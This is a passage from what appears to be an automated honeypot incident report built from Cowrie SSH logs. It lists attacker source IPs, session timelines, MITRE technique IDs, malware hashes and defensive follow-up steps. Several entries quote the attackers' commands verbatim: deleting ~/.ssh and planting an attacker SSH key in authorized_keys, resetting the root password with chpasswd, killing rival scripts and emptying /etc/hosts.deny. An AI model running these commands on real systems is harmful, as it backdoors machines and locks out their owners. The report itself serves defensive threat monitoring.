| `2026-06-04 08:55:06` | `cowrie.command.input` |
| `2026-06-04 08:55:06` | `cowrie.log.closed` |
| `2026-06-04 08:55:06` | `cowrie.session.params` |
| `2026-06-04 08:55:06` | `cowrie.command.input` |
| `2026-06-04 08:55:07` | `cowrie.log.closed` |
| `2026-06-04 08:55:07` | `cowrie.session.params` |
| `2026-06-04 08:55:07` | `cowrie.command.input` |
| `2026-06-04 08:55:07` | `cowrie.command.input` |
| `2026-06-04 08:55:09` | `cowrie.log.closed` |
| `2026-06-04 08:55:09` | `cowrie.session.params` |
| `2026-06-04 08:55:09` | `cowrie.command.input` |
| `2026-06-04 08:55:09` | `cowrie.log.closed` |
| `2026-06-04 08:55:10` | `cowrie.session.params` |
| `2026-06-04 08:55:10` | `cowrie.command.input` |
| `2026-06-04 08:55:10` | `cowrie.log.closed` |
| `2026-06-04 08:55:11` | `cowrie.session.params` |
| `2026-06-04 08:55:11` | `cowrie.command.input` |
| `2026-06-04 08:55:12` | `cowrie.log.closed` |
| `2026-06-04 08:55:12` | `cowrie.session.params` |
| `2026-06-04 08:55:12` | `cowrie.command.input` |
| `2026-06-04 08:55:12` | `cowrie.log.closed` |
| `2026-06-04 08:55:13` | `cowrie.session.params` |
| `2026-06-04 08:55:13` | `cowrie.command.input` |
| `2026-06-04 08:55:14` | `cowrie.log.closed` |
| `2026-06-04 08:55:14` | `cowrie.session.params` |
| `2026-06-04 08:55:14` | `cowrie.command.input` |
| `2026-06-04 08:55:15` | `cowrie.log.closed` |
| `2026-06-04 08:55:15` | `cowrie.session.params` |
| `2026-06-04 08:55:15` | `cowrie.command.input` |
| `2026-06-04 08:55:15` | `cowrie.log.closed` |
| `2026-06-04 08:55:16` | `cowrie.session.params` |
| `2026-06-04 08:55:16` | `cowrie.command.input` |
| `2026-06-04 08:55:16` | `cowrie.log.closed` |
| `2026-06-04 08:55:17` | `cowrie.session.params` |
| `2026-06-04 08:55:17` | `cowrie.command.input` |
| `2026-06-04 08:55:18` | `cowrie.log.closed` |
| `2026-06-04 08:55:18` | `cowrie.session.params` |
| `2026-06-04 08:55:18` | `cowrie.command.input` |
| `2026-06-04 08:55:19` | `cowrie.log.closed` |
| `2026-06-04 08:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.209.82[.]184` to AbuseIPDB if not already reported
- [ ] Block `58.209.82[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae52fade0976

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-06-04 08:56 |
| **Last Seen** | 2026-06-04 08:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:56:44` | `cowrie.session.connect` |
| `2026-06-04 08:56:44` | `cowrie.client.version` |
| `2026-06-04 08:56:44` | `cowrie.client.kex` |
| `2026-06-04 08:56:44` | `cowrie.login.success` |
| `2026-06-04 08:56:45` | `cowrie.session.params` |
| `2026-06-04 08:56:45` | `cowrie.command.input` |
| `2026-06-04 08:56:45` | `cowrie.command.failed` |
| `2026-06-04 08:56:45` | `cowrie.log.closed` |
| `2026-06-04 08:56:45` | `cowrie.session.params` |
| `2026-06-04 08:56:45` | `cowrie.command.input` |
| `2026-06-04 08:56:45` | `cowrie.session.file_download` |
| `2026-06-04 08:56:45` | `cowrie.log.closed` |
| `2026-06-04 08:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45e140fb3d4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-06-04 08:56 |
| **Last Seen** | 2026-06-04 08:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:56:47` | `cowrie.session.connect` |
| `2026-06-04 08:56:47` | `cowrie.client.version` |
| `2026-06-04 08:56:47` | `cowrie.client.kex` |
| `2026-06-04 08:56:48` | `cowrie.login.success` |
| `2026-06-04 08:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e24ed296aa

| Field | Detail |
|---|---|
| **Source IP** | `157.20.254[.]47` |
| **First Seen** | 2026-06-04 08:57 |
| **Last Seen** | 2026-06-04 08:58 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Lw0fCkx9lf5X"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 08:57:48` | `cowrie.session.connect` |
| `2026-06-04 08:57:48` | `cowrie.client.version` |
| `2026-06-04 08:57:48` | `cowrie.client.kex` |
| `2026-06-04 08:57:49` | `cowrie.login.success` |
| `2026-06-04 08:57:49` | `cowrie.session.params` |
| `2026-06-04 08:57:49` | `cowrie.command.input` |
| `2026-06-04 08:57:49` | `cowrie.command.failed` |
| `2026-06-04 08:57:49` | `cowrie.log.closed` |
| `2026-06-04 08:57:49` | `cowrie.session.params` |
| `2026-06-04 08:57:49` | `cowrie.command.input` |
| `2026-06-04 08:57:49` | `cowrie.session.file_download` |
| `2026-06-04 08:57:49` | `cowrie.log.closed` |
| `2026-06-04 08:58:06` | `cowrie.session.params` |
| `2026-06-04 08:58:06` | `cowrie.command.input` |
| `2026-06-04 08:58:07` | `cowrie.log.closed` |
| `2026-06-04 08:58:07` | `cowrie.session.params` |
| `2026-06-04 08:58:07` | `cowrie.command.input` |
| `2026-06-04 08:58:07` | `cowrie.log.closed` |
| `2026-06-04 08:58:07` | `cowrie.session.params` |
| `2026-06-04 08:58:07` | `cowrie.command.input` |
| `2026-06-04 08:58:07` | `cowrie.session.file_download` |
| `2026-06-04 08:58:07` | `cowrie.log.closed` |
| `2026-06-04 08:58:08` | `cowrie.session.params` |
| `2026-06-04 08:58:08` | `cowrie.command.input` |
| `2026-06-04 08:58:08` | `cowrie.log.closed` |
| `2026-06-04 08:58:08` | `cowrie.session.params` |
| `2026-06-04 08:58:08` | `cowrie.command.input` |
| `2026-06-04 08:58:08` | `cowrie.log.closed` |
| `2026-06-04 08:58:09` | `cowrie.session.params` |
| `2026-06-04 08:58:09` | `cowrie.command.input` |
| `2026-06-04 08:58:09` | `cowrie.command.input` |
| `2026-06-04 08:58:09` | `cowrie.log.closed` |
| `2026-06-04 08:58:09` | `cowrie.session.params` |
| `2026-06-04 08:58:09` | `cowrie.command.input` |
| `2026-06-04 08:58:09` | `cowrie.log.closed` |
| `2026-06-04 08:58:09` | `cowrie.session.params` |
| `2026-06-04 08:58:09` | `cowrie.command.input` |
| `2026-06-04 08:58:10` | `cowrie.log.closed` |
| `2026-06-04 08:58:10` | `cowrie.session.params` |
| `2026-06-04 08:58:10` | `cowrie.command.input` |
| `2026-06-04 08:58:10` | `cowrie.log.closed` |
| `2026-06-04 08:58:10` | `cowrie.session.params` |
| `2026-06-04 08:58:10` | `cowrie.command.input` |
| `2026-06-04 08:58:10` | `cowrie.log.closed` |
| `2026-06-04 08:58:10` | `cowrie.session.params` |
| `2026-06-04 08:58:10` | `cowrie.command.input` |
| `2026-06-04 08:58:11` | `cowrie.log.closed` |
| `2026-06-04 08:58:11` | `cowrie.session.params` |
| `2026-06-04 08:58:11` | `cowrie.command.input` |
| `2026-06-04 08:58:11` | `cowrie.log.closed` |
| `2026-06-04 08:58:11` | `cowrie.session.params` |
| `2026-06-04 08:58:11` | `cowrie.command.input` |
| `2026-06-04 08:58:12` | `cowrie.log.closed` |
| `2026-06-04 08:58:12` | `cowrie.session.params` |
| `2026-06-04 08:58:12` | `cowrie.command.input` |
| `2026-06-04 08:58:12` | `cowrie.log.closed` |
| `2026-06-04 08:58:12` | `cowrie.session.params` |
| `2026-06-04 08:58:12` | `cowrie.command.input` |
| `2026-06-04 08:58:12` | `cowrie.log.closed` |
| `2026-06-04 08:58:13` | `cowrie.session.params` |
| `2026-06-04 08:58:13` | `cowrie.command.input` |
| `2026-06-04 08:58:13` | `cowrie.log.closed` |
| `2026-06-04 08:58:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.20.254[.]47` to AbuseIPDB if not already reported
- [ ] Block `157.20.254[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbea30f6ea07

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 09:04 |
| **Last Seen** | 2026-06-04 09:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:04:52` | `cowrie.session.connect` |
| `2026-06-04 09:04:52` | `cowrie.client.version` |
| `2026-06-04 09:04:53` | `cowrie.client.kex` |
| `2026-06-04 09:04:53` | `cowrie.login.success` |
| `2026-06-04 09:04:53` | `cowrie.session.params` |
| `2026-06-04 09:04:53` | `cowrie.command.input` |
| `2026-06-04 09:04:53` | `cowrie.command.failed` |
| `2026-06-04 09:04:54` | `cowrie.log.closed` |
| `2026-06-04 09:04:54` | `cowrie.session.params` |
| `2026-06-04 09:04:54` | `cowrie.command.input` |
| `2026-06-04 09:04:54` | `cowrie.session.file_download` |
| `2026-06-04 09:04:54` | `cowrie.log.closed` |
| `2026-06-04 09:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970b2a49cfd7

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 09:04 |
| **Last Seen** | 2026-06-04 09:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:04:56` | `cowrie.session.connect` |
| `2026-06-04 09:04:56` | `cowrie.client.version` |
| `2026-06-04 09:04:56` | `cowrie.client.kex` |
| `2026-06-04 09:04:56` | `cowrie.login.success` |
| `2026-06-04 09:04:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51e70f779b39

| Field | Detail |
|---|---|
| **Source IP** | `114.242.24[.]31` |
| **First Seen** | 2026-06-04 09:05 |
| **Last Seen** | 2026-06-04 09:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Rj4ozU1VbHQt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:05:51` | `cowrie.session.connect` |
| `2026-06-04 09:05:52` | `cowrie.client.version` |
| `2026-06-04 09:05:52` | `cowrie.client.kex` |
| `2026-06-04 09:05:52` | `cowrie.login.success` |
| `2026-06-04 09:05:53` | `cowrie.session.params` |
| `2026-06-04 09:05:53` | `cowrie.command.input` |
| `2026-06-04 09:05:53` | `cowrie.command.failed` |
| `2026-06-04 09:05:53` | `cowrie.log.closed` |
| `2026-06-04 09:05:53` | `cowrie.session.params` |
| `2026-06-04 09:05:53` | `cowrie.command.input` |
| `2026-06-04 09:05:53` | `cowrie.session.file_download` |
| `2026-06-04 09:05:53` | `cowrie.log.closed` |
| `2026-06-04 09:06:05` | `cowrie.session.params` |
| `2026-06-04 09:06:05` | `cowrie.command.input` |
| `2026-06-04 09:06:06` | `cowrie.log.closed` |
| `2026-06-04 09:06:06` | `cowrie.session.params` |
| `2026-06-04 09:06:06` | `cowrie.command.input` |
| `2026-06-04 09:06:06` | `cowrie.log.closed` |
| `2026-06-04 09:06:06` | `cowrie.session.params` |
| `2026-06-04 09:06:06` | `cowrie.command.input` |
| `2026-06-04 09:06:07` | `cowrie.session.file_download` |
| `2026-06-04 09:06:07` | `cowrie.log.closed` |
| `2026-06-04 09:06:07` | `cowrie.session.params` |
| `2026-06-04 09:06:07` | `cowrie.command.input` |
| `2026-06-04 09:06:07` | `cowrie.log.closed` |
| `2026-06-04 09:06:08` | `cowrie.session.params` |
| `2026-06-04 09:06:08` | `cowrie.command.input` |
| `2026-06-04 09:06:08` | `cowrie.log.closed` |
| `2026-06-04 09:06:08` | `cowrie.session.params` |
| `2026-06-04 09:06:08` | `cowrie.command.input` |
| `2026-06-04 09:06:08` | `cowrie.command.input` |
| `2026-06-04 09:06:08` | `cowrie.log.closed` |
| `2026-06-04 09:06:08` | `cowrie.session.params` |
| `2026-06-04 09:06:08` | `cowrie.command.input` |
| `2026-06-04 09:06:09` | `cowrie.log.closed` |
| `2026-06-04 09:06:09` | `cowrie.session.params` |
| `2026-06-04 09:06:09` | `cowrie.command.input` |
| `2026-06-04 09:06:09` | `cowrie.log.closed` |
| `2026-06-04 09:06:09` | `cowrie.session.params` |
| `2026-06-04 09:06:09` | `cowrie.command.input` |
| `2026-06-04 09:06:10` | `cowrie.log.closed` |
| `2026-06-04 09:06:10` | `cowrie.session.params` |
| `2026-06-04 09:06:10` | `cowrie.command.input` |
| `2026-06-04 09:06:10` | `cowrie.log.closed` |
| `2026-06-04 09:06:10` | `cowrie.session.params` |
| `2026-06-04 09:06:10` | `cowrie.command.input` |
| `2026-06-04 09:06:11` | `cowrie.log.closed` |
| `2026-06-04 09:06:11` | `cowrie.session.params` |
| `2026-06-04 09:06:11` | `cowrie.command.input` |
| `2026-06-04 09:06:11` | `cowrie.log.closed` |
| `2026-06-04 09:06:11` | `cowrie.session.params` |
| `2026-06-04 09:06:11` | `cowrie.command.input` |
| `2026-06-04 09:06:12` | `cowrie.log.closed` |
| `2026-06-04 09:06:12` | `cowrie.session.params` |
| `2026-06-04 09:06:12` | `cowrie.command.input` |
| `2026-06-04 09:06:12` | `cowrie.log.closed` |
| `2026-06-04 09:06:12` | `cowrie.session.params` |
| `2026-06-04 09:06:12` | `cowrie.command.input` |
| `2026-06-04 09:06:13` | `cowrie.log.closed` |
| `2026-06-04 09:06:13` | `cowrie.session.params` |
| `2026-06-04 09:06:13` | `cowrie.command.input` |
| `2026-06-04 09:06:13` | `cowrie.log.closed` |
| `2026-06-04 09:06:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.242.24[.]31` to AbuseIPDB if not already reported
- [ ] Block `114.242.24[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581e7d27e932

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:08 |
| **Last Seen** | 2026-06-04 09:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:08:16` | `cowrie.session.connect` |
| `2026-06-04 09:08:16` | `cowrie.client.version` |
| `2026-06-04 09:08:16` | `cowrie.client.kex` |
| `2026-06-04 09:08:17` | `cowrie.login.success` |
| `2026-06-04 09:08:17` | `cowrie.session.params` |
| `2026-06-04 09:08:17` | `cowrie.command.input` |
| `2026-06-04 09:08:17` | `cowrie.command.failed` |
| `2026-06-04 09:08:18` | `cowrie.log.closed` |
| `2026-06-04 09:08:18` | `cowrie.session.params` |
| `2026-06-04 09:08:18` | `cowrie.command.input` |
| `2026-06-04 09:08:18` | `cowrie.session.file_download` |
| `2026-06-04 09:08:18` | `cowrie.log.closed` |
| `2026-06-04 09:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7956156d0625

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:08 |
| **Last Seen** | 2026-06-04 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:08:20` | `cowrie.session.connect` |
| `2026-06-04 09:08:20` | `cowrie.client.version` |
| `2026-06-04 09:08:20` | `cowrie.client.kex` |
| `2026-06-04 09:08:21` | `cowrie.login.success` |
| `2026-06-04 09:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f926d5998b7

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:09 |
| **Last Seen** | 2026-06-04 09:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:09:50` | `cowrie.session.connect` |
| `2026-06-04 09:09:50` | `cowrie.client.version` |
| `2026-06-04 09:09:50` | `cowrie.client.kex` |
| `2026-06-04 09:09:51` | `cowrie.login.success` |
| `2026-06-04 09:09:51` | `cowrie.session.params` |
| `2026-06-04 09:09:51` | `cowrie.command.input` |
| `2026-06-04 09:09:51` | `cowrie.command.failed` |
| `2026-06-04 09:09:51` | `cowrie.log.closed` |
| `2026-06-04 09:09:51` | `cowrie.session.params` |
| `2026-06-04 09:09:51` | `cowrie.command.input` |
| `2026-06-04 09:09:52` | `cowrie.session.file_download` |
| `2026-06-04 09:09:52` | `cowrie.log.closed` |
| `2026-06-04 09:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fbb366cc5d

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:09 |
| **Last Seen** | 2026-06-04 09:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:09:54` | `cowrie.session.connect` |
| `2026-06-04 09:09:54` | `cowrie.client.version` |
| `2026-06-04 09:09:54` | `cowrie.client.kex` |
| `2026-06-04 09:09:54` | `cowrie.login.success` |
| `2026-06-04 09:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.27.20[.]28` to AbuseIPDB if not already reported
- [ ] Block `2.27.20[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0a6953f33b

| Field | Detail |
|---|---|
| **Source IP** | `2.27.20[.]28` |
| **First Seen** | 2026-06-04 09:12 |
| **Last Seen** | 2026-06-04 09:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
